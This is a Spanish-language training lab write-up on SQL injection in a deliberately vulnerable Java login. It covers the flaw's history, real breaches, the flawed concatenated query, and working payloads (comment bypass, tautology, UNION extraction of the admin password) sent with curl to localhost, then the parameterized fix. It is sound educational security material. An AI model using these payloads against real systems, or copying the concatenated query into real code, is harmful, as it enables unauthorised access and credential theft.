# 01 · SQL Injection en el login

**Categoría OWASP:** [A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
**CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html) · **Severidad:** Crítica
**Impacto:** salto de autenticación, robo de toda la base de datos, modificación/borrado de datos y, en el peor caso, ejecución de comandos en el servidor.

---

## Qué es

Una inyección SQL ocurre cuando una aplicación construye una consulta a la base de datos
**pegando texto que viene del usuario** directamente dentro del SQL. La aplicación *espera*
que ese texto sea un dato (un nombre, un email), pero no hay nada que lo obligue a serlo. Si
el texto contiene caracteres que el motor SQL interpreta como código —comillas, `--`, `OR`,
`UNION`— el atacante deja de rellenar un dato y pasa a **reescribir la consulta**.

La raíz del problema es conceptual y siempre la misma: **se mezcla código (la sentencia SQL)
con datos (lo que teclea el usuario) en la misma cadena de texto**, y el motor no puede
distinguir dónde acaba uno y empieza el otro. Es la misma familia de fallo que el XSS (mezclar
HTML con datos) o la inyección de comandos (mezclar shell con datos).

## Un poco de historia

La técnica se documentó por primera vez el **25 de diciembre de 1998** —sí, en Navidad— por un
investigador con el pseudónimo **rain.forest.puppy** (Jeff Forristal) en el número 54 de la
revista [Phrack](https://phrack.org/issues/54/8), en un artículo titulado *"NT Web Technology
Vulnerabilities"*. Describía cómo un Microsoft SQL Server devolvía datos sensibles a través de
campos de entrada normales como "nombre" o "teléfono". Curiosamente, él no lo llamó "SQL
injection": hablaba de *"piggybacking SQL statements"* (SQL "a caballito"). El nombre con el
que hoy lo conocemos vino después.

Lo demoledor es que, **más de 25 años después, sigue en el top del OWASP Top 10**. Es de los
fallos más antiguos, mejor entendidos y mejor documentados de la historia del software… y
sigue apareciendo cada semana en la lista de CVEs. La razón: se previene trivialmente si sabes
cómo, pero basta *una* consulta mal escrita en cualquier rincón de una aplicación enorme para
abrir la puerta.

## Casos reales famosos

- **Sony Pictures, 2011 (LulzSec).** Con *una sola* inyección SQL, el grupo LulzSec accedió a
  más de **un millón de cuentas** de usuario. Lo que lo hizo escandaloso no fue solo el SQLi,
  sino que Sony guardaba las contraseñas **en texto plano, sin cifrar**. Su frase resumió el
  desastre: *"From a single injection, we accessed EVERYTHING"*.
  [(Forbes)](https://www.forbes.com/sites/parmyolson/2011/06/02/lulzsec-hackers-purge-sonypictures-com/)

- **Heartland Payment Systems, 2008 (Albert Gonzalez).** Una inyección SQL fue el punto de
  entrada al robo de **~130 millones de números de tarjeta**, en su momento la mayor brecha de
  datos de pago registrada. Gonzalez fue condenado a 20 años. El mismo grupo usó SQLi también
  contra 7-Eleven y Hannaford Brothers.
  [(Computerworld)](https://www.computerworld.com/article/1555445/sql-injection-attacks-led-to-heartland-hannaford-breaches.html)

- **TalkTalk, 2015.** Atacantes (algunos adolescentes, uno de 16 años) usaron la herramienta
  automática **sqlmap** contra páginas heredadas y vulnerables, robando datos de ~157.000
  clientes, incluidos miles de cuentas bancarias. La ICO británica le impuso una multa récord
  de **£400.000**, agravada porque TalkTalk ya había sufrido un SQLi previo y no lo corrigió.
  [(The Hacker News)](https://thehackernews.com/2016/10/talktalk-data-breach.html) ·
  [(ICO)](https://ico.org.uk/about-the-ico/media-centre/talktalk-cyber-attack-how-the-ico-investigation-unfolded/)

## Curiosidades

- **"Little Bobby Tables".** El chiste más famoso de la informática es la tira
  [xkcd #327](https://xkcd.com/327/): un colegio llama a una madre porque su hijo se llama
  literalmente `Robert'); DROP TABLE Students;--`. Al colegio se le "cayó" la tabla de alumnos
  al guardar el nombre. De ahí el mote *Bobby Tables* para los payloads de SQLi.
- **sqlmap**, la navaja suiza. Existe una herramienta open source (`sqlmap`) que automatiza
  todo el proceso: detecta el punto inyectable, deduce el tipo de base de datos, y extrae tablas
  enteras sola. Es la que se usó en TalkTalk. Que exista una herramienta tan pulida es la mejor
  prueba de lo mecánico —y por tanto lo prevenible— que es el ataque.
- **Matrículas anti-multa.** Corre la anécdota (medio leyenda urbana) de gente matriculando
  coches con placas tipo `NULL` o con comillas, buscando romper los sistemas de multas
  automáticas por foto. El caso real documentado del investigador "droogie" en DEF CON 2019 con
  la matrícula `NULL` acabó generándole *miles* de dólares en multas ajenas por errores en la
  base de datos de tráfico.

## El código vulnerable

En [`UserRepository.java`](../src/main/java/com/cibernati/vulnbank/UserRepository.java):

```java
String sql = "SELECT id, username, balance, role FROM users " +
        "WHERE username = '" + username + "' AND password = '" + password + "'";
return jdbc.queryForList(sql);
```

`username` y `password` se concatenan a mano. La consulta *pretendida* es:

```sql
SELECT ... FROM users WHERE username = 'diego' AND password = 'S3cr3tPass!'
```

Pero el contenido de esas variables lo elige el atacante, y puede contener SQL.

## La explotación

Todos los ejemplos de abajo están **probados contra esta app** y muestran la salida real.
La app arranca con `./mvnw spring-boot:run` (ver [testing](#cómo-probarlo-tú-mismo)).

### A) Saltar el login con un comentario

Enviamos como **usuario** el texto `admin' -- ` (nombre, una comilla, y `--`):

```json
{ "username": "admin' -- ", "password": "loquesea" }
```

La consulta ejecutada pasa a ser:

```sql
SELECT ... FROM users WHERE username = 'admin' -- ' AND password = 'loquesea'
```

La comilla cierra el valor de `username`, y `--` **comenta todo lo que viene después**,
incluida la comprobación de la contraseña. Entramos como `admin`:

```json
{"ok":true,"user":{"ID":2,"USERNAME":"admin","BALANCE":99999,"ROLE":"ADMIN"}}
```

### B) La tautología clásica (`' OR '1'='1`)

Enviando en la **contraseña** el valor `' OR '1'='1`, la condición se vuelve siempre cierta:

```sql
... WHERE username = 'admin' AND password = '' OR '1'='1'
```

Como `'1'='1'` es verdadero para *todas* las filas, la consulta devuelve la primera de la tabla
y entramos sin credenciales válidas. Es el payload que casi todo el mundo ha visto alguna vez.

### C) Robar datos con `UNION` (esto ya no es saltarse el login)

El bypass es vistoso, pero lo grave de verdad es la **exfiltración**: usar la inyección para
que la consulta devuelva datos que no debería. Con `UNION SELECT` pegamos una segunda consulta
que lee la columna `password`, colocándola donde la app espera el `username`:

```json
{ "username": "x' UNION SELECT id, password, balance, role FROM users WHERE username='admin' -- ", "password": "x" }
```

La respuesta nos entrega **la contraseña real de admin** en el campo `username`:

```json
{"ok":true,"user":{"ID":2,"USERNAME":"adminPassword","BALANCE":99999,"ROLE":"ADMIN"}}
```

`UNION` requiere que las dos consultas tengan el **mismo número de columnas y tipos
compatibles**; averiguarlo es parte del juego del atacante (en ataques reales se prueba
`UNION SELECT NULL`, `NULL,NULL`, etc. hasta acertar). A partir de aquí, un atacante puede
volcar cualquier tabla: usuarios, tarjetas, `information_schema` para descubrir el esquema…

## Tipos de inyección SQL

No siempre la aplicación te devuelve el resultado tan cómodamente. Según cómo se extraiga la
información, se clasifican en:

- **In-band (directa).** El resultado sale por el mismo canal.
  - *UNION-based:* como el ejemplo C, pegando consultas con `UNION`.
  - *Error-based:* se fuerza un error de la base de datos que revela datos en el mensaje.
- **Blind (a ciegas).** La app no muestra el dato ni el error, pero su comportamiento cambia.
  - *Boolean-based:* se hacen preguntas de sí/no (`AND 1=1` vs `AND 1=2`) y se deduce cada bit
    por si la página responde distinto.
  - *Time-based:* se inyecta un retraso (`AND SLEEP(5)`) y se mide el tiempo de respuesta para
    inferir la información letra a letra. Lento pero imparable.
- **Out-of-band.** El dato se exfiltra por otro canal (una petición DNS/HTTP que provoca el
  servidor), útil cuando no hay respuesta observable.

## El arreglo: consultas parametrizadas

La solución **no** es "filtrar comillas" ni mantener una lista negra de palabras: eso se salta
de mil formas (codificaciones, comentarios, mayúsculas alternadas…) y siempre se te escapa un
caso. La solución correcta es **no volver a mezclar datos con código**: se usan **parámetros**
(`?`), y el driver de la base de datos trata el valor como un dato, sin interpretarlo como SQL.

```java
public List<Map<String, Object>> login(String username, String password) {
    String sql = "SELECT id, username, balance, role FROM users " +
            "WHERE username = ? AND password = ?";
    return jdbc.queryForList(sql, username, password);
}
```

Con esto, enviar `admin' -- ` busca literalmente un usuario que se llame `admin' -- `, que no
existe, y el login falla como debe. La comilla ya no rompe nada porque nunca forma parte del
texto de la consulta.

### Defensa en profundidad

Las consultas parametrizadas resuelven el fallo de raíz, pero en un sistema real se suman capas:

- **Menor privilegio:** que el usuario de BBDD de la app no pueda `DROP TABLE` ni leer tablas
  que no le tocan. Limita el daño si algo falla.
- **ORM / capa de acceso:** JPA/Hibernate parametriza por defecto; reduce la superficie (ojo,
  no es magia, ver abajo).
- **Validación de entrada** como refuerzo, nunca como defensa principal.
- **WAF** para frenar ataques automáticos tipo sqlmap, como red de seguridad, no como cura.
- **No guardar contraseñas en claro** (lo de Sony): aunque roben la tabla, que no sirva de nada.
  → esto lo veremos en su propia vulnerabilidad del laboratorio.

## Cómo se ve esto en un proyecto Java real

- **JDBC / `JdbcTemplate`** → usar siempre `?` y pasar los valores como argumentos, nunca
  concatenar. `PreparedStatement` en JDBC puro hace lo mismo.
- **JPA / Hibernate** → parámetros con nombre (`:username`) o *named queries*. El peligro
  **reaparece** si usas `createQuery`/`createNativeQuery` con un string construido a mano: el
  ORM no te protege si tú mismo concatenas el JPQL/SQL.
- **Oracle (PL/SQL)** → el mismo principio con *bind variables* (`:1`, `:name`). Concatenar en
  un `EXECUTE IMMEDIATE` es la versión Oracle exacta de este fallo.

## Cómo probarlo tú mismo

Requisitos: Java 17+. No necesitas nada más.

**1. Arranca la app** (desde la raíz del proyecto):

```bash
./mvnw spring-boot:run          # Windows PowerShell: .\mvnw.cmd spring-boot:run
```

Espera a ver `Started VulnbankApplication`. Queda escuchando en `http://localhost:8080`.

**2. Comprueba primero que el login normal funciona** (para tener con qué comparar):

```bash
curl -s -X POST http://localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"diego\",\"password\":\"S3cr3tPass!\"}"
```

Debe responder `"ok":true` con el usuario `diego`. Prueba también una contraseña mala: debe
responder `"ok":false`. Esto demuestra que la validación "normal" sí funciona.

**3. Lanza el bypass de autenticación** (entrar como admin sin su contraseña):

```bash
curl -s -X POST http://localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"admin' -- \",\"password\":\"x\"}"
```

Deberías obtener `"ROLE":"ADMIN"` sin haber puesto la contraseña de admin.

**4. Extrae la contraseña de admin con UNION** (exfiltración):

```bash
curl -s -X POST http://localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"x' UNION SELECT id, password, balance, role FROM users WHERE username='admin' -- \",\"password\":\"x\"}"
```

En el campo `USERNAME` de la respuesta verás `adminPassword`: la contraseña real, robada.

**5. (Opcional) Mira la base de datos por dentro.** Con la app arrancada, abre
`http://localhost:8080/h2-console` en el navegador. En *JDBC URL* pon `jdbc:h2:mem:vulnbank`,
usuario `sa`, sin contraseña, y podrás ver la tabla `users` con las contraseñas que acabas de
robar por la API. Es útil para *ver* qué había realmente detrás.

> Para confirmar el arreglo: aplica la versión parametrizada de la sección anterior en
> `UserRepository.java`, reinicia la app, y repite los pasos 3 y 4. Ahora deben responder
> `"ok":false` — la inyección ya no funciona, pero el login legítimo del paso 2 sigue igual.

## Regla para llevarse a casa

> Los datos que vienen del usuario **nunca** deben formar parte del texto de una consulta.
> Van siempre como parámetros (`?` / `:nombre`). Si ves una `"` seguida de `+ variable + "`
> dentro de un SQL, es una inyección esperando a ocurrir.

## Para seguir leyendo

- [OWASP – SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Phrack 54 – "NT Web Technology Vulnerabilities" (rain.forest.puppy, 1998)](https://phrack.org/issues/54/8)
- [xkcd #327 – Exploits of a Mom](https://xkcd.com/327/)
- [PortSwigger Web Security Academy – SQL injection](https://portswigger.net/web-security/sql-injection) (laboratorios gratis para practicar)
